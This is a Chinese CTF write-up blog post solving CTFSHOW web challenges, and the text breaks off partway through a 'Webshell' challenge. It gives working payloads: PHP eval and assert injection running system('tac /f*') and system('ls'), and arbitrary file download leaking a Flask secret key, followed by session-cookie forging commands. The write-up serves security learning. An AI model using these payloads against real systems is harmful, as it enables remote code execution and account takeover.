<!DOCTYPE html>
<html lang="zh-CN">
    <head prefix="og: https://ogp.me/ns#">
  <meta charset="utf-8">
  <meta name="referrer" content="no-referrer" />
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="color-scheme" content="light dark">
  
  <title>CTFSHOW-菜狗杯 - Boogiepop Doesn&#39;t Laugh</title>
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    <link rel='manifest' href='/manifest.json'>
  

  
  
  
  <meta property="og:title" content="CTFSHOW-菜狗杯 - Boogiepop Doesn&#39;t Laugh" />
  
  <meta property="og:type" content="article" />
  
  <meta property="og:url" content="http://boogipop.com/2023/03/02/CTFSHOW-%E8%8F%9C%E7%8B%97%E6%9D%AF/index.html" />
  
  <meta property="og:image" content="/favicon.png" />
  
  <meta property="og:article:published_time" content="2023-03-02T10:29:56.000Z" />
  
  <meta property="og:article:author" content="Boogipop" />
  
  

  
<link rel="stylesheet" href="/css/var.css">

  
<link rel="stylesheet" href="/css/main.css">

  
<link rel="stylesheet" href="/css/typography.css">

  
<link rel="stylesheet" href="/css/code-highlighting.css">

  
<link rel="stylesheet" href="/css/components.css">

  
<link rel="stylesheet" href="/css/nav.css">

  
<link rel="stylesheet" href="/css/paginator.css">

  
<link rel="stylesheet" href="/css/footer.css">

  
<link rel="stylesheet" href="/css/post-list.css">

  
<link rel="stylesheet" href="/css/giscus.css">

  
  
<link rel="stylesheet" href="/css/rainbow-banner.css">

  
  
  
<link rel="stylesheet" href="/css/toc.css">

  
  
    
<link rel="stylesheet" href="/css/giscus.css">

  
  
  
  
<link rel="stylesheet" href="/css/post.css">

  
  
  
  
  

  
<meta name="generator" content="Hexo 6.3.0"></head>
    <body
        data-color-scheme="auto"
        data-uppercase-categories="true"
        
        data-rainbow-banner="true"
        data-rainbow-banner-shown="auto"
        data-rainbow-banner-month="6"
        data-rainbow-banner-colors="#e50000,#ff8d00,#ffee00,#008121,#004cff,#760188"
        
        data-config-root="/"
        
        data-toc="true"
        data-toc-max-depth="2"
        
        
    >
        <nav id="theme-nav">
    <div class="inner">
        <a class="title" href="/">Blog</a>
        <div class="nav-arrow"></div>
        <div class="nav-items">
            <a class="nav-item nav-item-home" href="/">Home</a>
            
            
            <a class="nav-item" href="/archives">Archives</a>
            
            
            
            <a class="nav-item" href="/friends">Friends</a>
            
            
            
            <a class="nav-item" href="/about">About</a>
            
            
            
            <a class="nav-item" href="/categories">Categories</a>
            
            
            
            <a class="nav-item nav-item-github nav-item-icon" href="https://github.com/MrWillCom" target="_blank" aria-label="GitHub">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-codepen nav-item-icon" href="https://codepen.io/mrwillcom" target="_blank" aria-label="CodePen">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-patreon nav-item-icon" href="https://www.patreon.com/MrWillCom" target="_blank" aria-label="Patreon">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-mastodon nav-item-icon" href="https://noc.social/@MrWillCom" target="_blank" aria-label="Mastodon">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-discord nav-item-icon" href="https://discord.gg/UKuFDjcfY8" target="_blank" aria-label="Discord">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-search nav-item-icon" href="/search" target="_blank" aria-label="Search">&nbsp;</a>
            
            
        </div>
    </div>
</nav>
        
<article class="post">
    <div class="meta">
        
        <div class="categories text-uppercase">
        
            <a href="/categories/WriteUp/">WriteUp</a>
        
        </div>
        

        
        <div class="date" id="date">
            <span>March</span>
            <span>2,</span>
            <span>2023</span>
        </div>
        

        <h2 class="title">CTFSHOW-菜狗杯</h2>
    </div>

    <div class="divider"></div>

    <div class="content">
        <h2 id="web签到"><a href="#web签到" class="headerlink" title="web签到"></a>web签到</h2><p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668872351620-4dc9b66c-364d-4153-ad40-e3591bf0b167.png#averageHue=%23f8f8f8&clientId=u4ca489eb-28c7-4&from=paste&height=414&id=u79024e77&name=image.png&originHeight=518&originWidth=907&originalType=binary&ratio=1&rotation=0&showTitle=false&size=54569&status=done&style=none&taskId=uc87e49e6-4717-440c-83ed-d05340e1dca&title=&width=725.6" alt="image.png"><br>考点：RCE<br>这签到真恶心</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2022-11-10 17:20:38</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2022-11-11 09:38:59</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[<span class="variable">$_GET</span>[<span class="variable">$_POST</span>[<span class="variable">$_COOKIE</span>[<span class="string">&#x27;CTFshow-QQ群:&#x27;</span>]]]][<span class="number">6</span>][<span class="number">0</span>][<span class="number">7</span>][<span class="number">5</span>][<span class="number">8</span>][<span class="number">0</span>][<span class="number">9</span>][<span class="number">4</span>][<span class="number">4</span>]);</span><br></pre></td></tr></table></figure>
<p>就是有点绕：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?a=b&amp;b[<span class="number">6</span>][<span class="number">0</span>][<span class="number">7</span>][<span class="number">5</span>][<span class="number">8</span>][<span class="number">0</span>][<span class="number">9</span>][<span class="number">4</span>][<span class="number">4</span>]=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;tac /f*&#x27;</span>);</span><br><span class="line">A=a</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668866519832-03ae04d0-29fb-468a-b903-022e6b8481c3.png#averageHue=%23757574&clientId=ua525d500-8aef-4&from=paste&height=481&id=u952d434c&name=image.png&originHeight=601&originWidth=1269&originalType=binary&ratio=1&rotation=0&showTitle=false&size=54360&status=done&style=none&taskId=u8641ee40-ee29-4177-a08a-19cebc3fe5a&title=&width=1015.2" alt="image.png"></p>
<h2 id="web2-c0me-t0-s1gn"><a href="#web2-c0me-t0-s1gn" class="headerlink" title="web2 c0me_t0_s1gn"></a>web2 c0me_t0_s1gn</h2><p>考点：前端JS<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668868225967-1ff4a5c2-bda3-4986-859b-3532b6498008.png#averageHue=%23fefdfd&clientId=ua525d500-8aef-4&from=paste&height=160&id=u5ec2b873&name=image.png&originHeight=200&originWidth=1172&originalType=binary&ratio=1&rotation=0&showTitle=false&size=13175&status=done&style=none&taskId=u93a68920-5b82-4491-a8fa-9be078c3349&title=&width=937.6" alt="image.png"><br>直接在控制台得</p>
<h2 id="我的眼里只有"><a href="#我的眼里只有" class="headerlink" title="我的眼里只有$"></a>我的眼里只有$</h2><p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668872330832-0c970a97-ae1e-4e4a-83d1-fcb2f07c8bb6.png#averageHue=%23f6f6f6&clientId=u4ca489eb-28c7-4&from=paste&height=255&id=u97e4d760&name=image.png&originHeight=319&originWidth=1050&originalType=binary&ratio=1&rotation=0&showTitle=false&size=30540&status=done&style=none&taskId=uc057c0ef-22d6-4a52-9ffd-db3975cb192&title=&width=840" alt="image.png"><br>考点：RCE</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2022-11-10 17:20:38</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2022-11-11 08:21:54</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$_</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
<p><code>_=b&amp;b=c&amp;c=d&amp;d=e&amp;e=f&amp;f=g&amp;g=h&amp;h=i&amp;i=j&amp;j=k&amp;k=l&amp;l=m&amp;m=o&amp;o=p&amp;p=q&amp;q=r&amp;r=s&amp;s=t&amp;t=u&amp;u=v&amp;v=w&amp;w=x&amp;x=y&amp;y=z&amp;z=A&amp;A=B&amp;B=C&amp;C=D&amp;D=E&amp;E=F&amp;F=G&amp;G=H&amp;H=I&amp;I=J&amp;J=L&amp;L=phpinfo();</code><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668868911554-c3e9fe36-ac57-4b76-adac-b659b5dc8881.png#averageHue=%23d7cfa5&clientId=ua525d500-8aef-4&from=paste&height=283&id=ubcdd4a6e&name=image.png&originHeight=354&originWidth=1173&originalType=binary&ratio=1&rotation=0&showTitle=false&size=55702&status=done&style=none&taskId=ue5a2720c-0dfa-4c53-94c4-2279cbc629b&title=&width=938.4" alt="image.png"><br>这样就可以rce了</p>
<h2 id="抽老婆"><a href="#抽老婆" class="headerlink" title="抽老婆"></a>抽老婆</h2><p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668872320826-78cb2f53-5cdc-4779-939e-b660977530b7.png#averageHue=%23f6f6f6&clientId=u4ca489eb-28c7-4&from=paste&height=266&id=u14b5d5cd&name=image.png&originHeight=333&originWidth=964&originalType=binary&ratio=1&rotation=0&showTitle=false&size=33984&status=done&style=none&taskId=uef4d64b5-bb80-4e5b-9574-33afb4c671b&title=&width=771.2" alt="image.png"><br>考点：任意文件下载,JWT<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668869473050-effce951-335b-4b1d-8faa-bf5bd4aa292e.png#averageHue=%23e5c89c&clientId=ua525d500-8aef-4&from=paste&height=269&id=uf17c99d6&name=image.png&originHeight=336&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=false&size=24155&status=done&style=none&taskId=u10ac99cf-cd30-485d-a73f-0623e767250&title=&width=1536" alt="image.png"><br>一个抽二次元老婆的题目<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668869489475-6f4d3c02-d5ea-4609-bfb5-f406b3101816.png#averageHue=%23a7a186&clientId=ua525d500-8aef-4&from=paste&height=112&id=ub049555b&name=image.png&originHeight=140&originWidth=857&originalType=binary&ratio=1&rotation=0&showTitle=false&size=35883&status=done&style=none&taskId=u8bcc382c-3437-4d18-b15c-1dac17b1571&title=&width=685.6" alt="image.png"><br>有两个选项，左边的没啥意思，右边有个下载，可能是洞挖多了，看到这个就条件反射了<br>经过测试是有一个任意文件下载的漏洞的,根据报错信息，我们可以知道当前的目录：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668869539021-26de929b-d0a8-47cf-a4a6-dda7db38ffcc.png#averageHue=%23f8f5f5&clientId=ua525d500-8aef-4&from=paste&height=176&id=u591f7633&name=image.png&originHeight=220&originWidth=679&originalType=binary&ratio=1&rotation=0&showTitle=false&size=25856&status=done&style=none&taskId=u0b2aed1a-9387-40ce-b7f6-ac37aa13853&title=&width=543.2" alt="image.png"><br>读取一下app.py:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># !/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*-coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"># File       : app.py</span></span><br><span class="line"><span class="string"># Time       ：2022/11/07 09:16</span></span><br><span class="line"><span class="string"># Author     ：g4_simon</span></span><br><span class="line"><span class="string"># version    ：python 3.9.7</span></span><br><span class="line"><span class="string"># Description：抽老婆，哇偶~</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="comment">#初始化全局变量</span></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="string">&#x27;tanji_is_A_boy_Yooooooooooooooooooooo!&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():  </span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/getwifi&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getwifi</span>():</span><br><span class="line">    session[<span class="string">&#x27;isadmin&#x27;</span>]=<span class="literal">False</span></span><br><span class="line">    wifi=random.choice(os.listdir(<span class="string">&#x27;static/img&#x27;</span>))</span><br><span class="line">    session[<span class="string">&#x27;current_wifi&#x27;</span>]=wifi</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;getwifi.html&#x27;</span>,wifi=wifi)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/download&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">source</span>(): </span><br><span class="line">    filename=request.args.get(<span class="string">&#x27;file&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> filename:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;msg&quot;</span>:<span class="string">&quot;你想干什么？&quot;</span>&#125;)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> send_file(<span class="string">&#x27;static/img/&#x27;</span>+filename,as_attachment=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/secret_path_U_never_know&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getflag</span>():</span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">&#x27;isadmin&#x27;</span>]:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;msg&quot;</span>:flag&#125;)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;msg&quot;</span>:<span class="string">&quot;你怎么知道这个路径的？不过还好我有身份验证&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">80</span>,debug=<span class="literal">True</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>简单的审一下会发现是一个JWT：<br>然后key已经在源码中有了，我们去伪造一下我们的session:<br>这里用jwt.io是不行的，我们用flask-session-cookie-manager-master<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668870086910-2b9e0d14-2e00-4442-bece-9a8178ea5595.png#averageHue=%23242424&clientId=ua525d500-8aef-4&from=paste&height=282&id=u045f56f0&name=image.png&originHeight=352&originWidth=1538&originalType=binary&ratio=1&rotation=0&showTitle=false&size=57792&status=done&style=none&taskId=ucb3531fa-e760-48e0-8984-401b95d35f8&title=&width=1230.4" alt="image.png"><br><code>python flask_session_cookie_manager3.py decode -c &quot;eyJjdXJyZW50X3dpZmkiOiIxZDRkYWQwZTFjYThkNTYyODU1MmE3MTY5OThmNmE0Mi5qcGciLCJpc2FkbWluIjpmYWxzZX0.Y3jryw.CIhqtqzRYMXWEjglBwzJvkip4LM&quot; -s &quot;tanji_is_A_boy_Yooooooooooooooooooooo!&quot;</code><br><code>python flask_session_cookie_manager3.py encode -t &quot;&#123;&#39;current_wifi&#39;: &#39;1d4dad0e1ca8d5628552a716998f6a42.jpg&#39;, &#39;isadmin&#39;: True&#125;&quot; -s &quot;tanji_is_A_boy_Yooooooooooooooooooooo!&quot;</code><br>运行上面两条语句来伪造最后根据代码中写的secret_path_U_never_know路由去得到flag</p>
<h2 id="一言既出"><a href="#一言既出" class="headerlink" title="一言既出"></a>一言既出</h2><p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668872311041-44aeb967-6604-40ab-8cdc-d92f1c2cd408.png#averageHue=%23f6f6f6&clientId=u4ca489eb-28c7-4&from=paste&height=362&id=u6de13094&name=image.png&originHeight=453&originWidth=966&originalType=binary&ratio=1&rotation=0&showTitle=false&size=41441&status=done&style=none&taskId=u623f84b8-ef4c-4475-b49a-13c57505933&title=&width=772.8" alt="image.png"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;  </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>] == <span class="number">114514</span>)&#123;</span><br><span class="line">        <span class="title function_ invoke__">assert</span>(<span class="string">&quot;intval(<span class="subst">$_GET</span>[num])==1919810&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;一言既出，驷马难追!&quot;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>挺有意思的，第一次做的时候是非预期，这一次就按预期走一次<br>这边存在一个断言，我们利用断言让assert返回true也就是让里面的语句执行为真</p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668870826994-6e622611-a43f-45ae-a321-47eb8268b613.png#averageHue=%23eae9e7&clientId=ua525d500-8aef-4&from=paste&height=296&id=ue804c09b&name=image.png&originHeight=370&originWidth=990&originalType=binary&ratio=1&rotation=0&showTitle=false&size=63202&status=done&style=none&taskId=u19aa1055-e3f5-4be2-9591-90865f1d817&title=&width=792" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668870868987-7592bff2-3aef-4d25-907f-230544630da0.png#averageHue=%23efeeee&clientId=ua525d500-8aef-4&from=paste&height=106&id=u778cb4b4&name=image.png&originHeight=133&originWidth=594&originalType=binary&ratio=1&rotation=0&showTitle=false&size=8267&status=done&style=none&taskId=u59eed7eb-c5ad-464b-9b96-523984bcbcb&title=&width=475.2" alt="image.png"><br>这个意思也就是说假如我们往assert里传入了一个boolean类型的指令话，如果判断为true那assert也返回true反之<br>这里有很多种payload，我一个个的列下来：<br><code>114514);(1919810</code><br><code>114514)==1%20or%20system(%27ls%27);%23</code><br>这一条命令还可以远程RCE<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668871200062-79314df5-b237-48d5-bd22-6f33b42b5da2.png#averageHue=%23818181&clientId=ua525d500-8aef-4&from=paste&height=432&id=u56ea7ae2&name=image.png&originHeight=540&originWidth=1219&originalType=binary&ratio=1&rotation=0&showTitle=false&size=41061&status=done&style=none&taskId=u486fd947-790b-4b66-ba0d-5cdb9159c68&title=&width=975.2" alt="image.png"><br><code>114514);%23</code><br>以上都可以，很骚反正</p>
<h2 id="驷马难追"><a href="#驷马难追" class="headerlink" title="驷马难追"></a>驷马难追</h2><p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668872300829-21df14a0-cb99-4e27-ac1e-d6c3084ffca1.png#averageHue=%23f5f5f5&clientId=u4ca489eb-28c7-4&from=paste&height=274&id=uad9d9011&name=image.png&originHeight=343&originWidth=1043&originalType=binary&ratio=1&rotation=0&showTitle=false&size=35909&status=done&style=none&taskId=u17940059-64ea-4fc4-8146-496a981600a&title=&width=834.4" alt="image.png"><br>这里就要用到我说的非预期了</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;  </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">     <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>] == <span class="number">114514</span> &amp;&amp; <span class="title function_ invoke__">check</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">              <span class="title function_ invoke__">assert</span>(<span class="string">&quot;intval(<span class="subst">$_GET</span>[num])==1919810&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;一言既出，驷马难追!&quot;</span>);</span><br><span class="line">              <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">     &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> !<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z]|\;|\(|\)/&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?mum=114514%2b1805296</span><br></pre></td></tr></table></figure>
<p>加法运算，想不到吧<br>不要看起来很小儿科，做题的时候真可能想不到的，汲取思路！</p>
<h2 id="TAPTAPTAP"><a href="#TAPTAPTAP" class="headerlink" title="TAPTAPTAP"></a>TAPTAPTAP</h2><p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668872289158-3aaa6150-d3f9-4d02-bb96-ff9394a0124c.png#averageHue=%23f8f8f8&clientId=u4ca489eb-28c7-4&from=paste&height=388&id=ueffbabbd&name=image.png&originHeight=485&originWidth=965&originalType=binary&ratio=1&rotation=0&showTitle=false&size=48009&status=done&style=none&taskId=ucb5cf1cf-486c-439a-9a02-122e000ca9b&title=&width=772" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668871517436-3f724620-2ebd-4c49-b81e-fa8aac0494ae.png#averageHue=%23fbf8f6&clientId=u4ca489eb-28c7-4&from=paste&height=102&id=u0f09ce99&name=image.png&originHeight=127&originWidth=1028&originalType=binary&ratio=1&rotation=0&showTitle=false&size=23375&status=done&style=none&taskId=u58174180-f50a-4e24-8f6f-d4ec349088f&title=&width=822.4" alt="image.png"><br>在js发现了可疑的东西：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668871535014-4266d406-f1d5-4f7b-a51d-f3474284ed49.png#averageHue=%23fefdfc&clientId=u4ca489eb-28c7-4&from=paste&height=137&id=u351c13e4&name=image.png&originHeight=171&originWidth=571&originalType=binary&ratio=1&rotation=0&showTitle=false&size=11109&status=done&style=none&taskId=ubcd93f5a-d01b-41cc-85a9-093883eff43&title=&width=456.8" alt="image.png"><br>进去看看：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668871549083-a60d1203-7cba-4d83-bfe3-03eccc47b0e8.png#averageHue=%23f9f9e8&clientId=u4ca489eb-28c7-4&from=paste&height=74&id=uf578c216&name=image.png&originHeight=92&originWidth=522&originalType=binary&ratio=1&rotation=0&showTitle=false&size=6309&status=done&style=none&taskId=u7730ff1b-bb54-4b7d-8dcd-76d87362427&title=&width=417.6" alt="image.png"></p>
<h2 id="Webshell"><a href="#Webshell" class="headerlink" title="Webshell"></a>Webshell</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Webshell</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$cmd</span> = <span class="string">&#x27;echo &quot;Hello World!&quot;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title 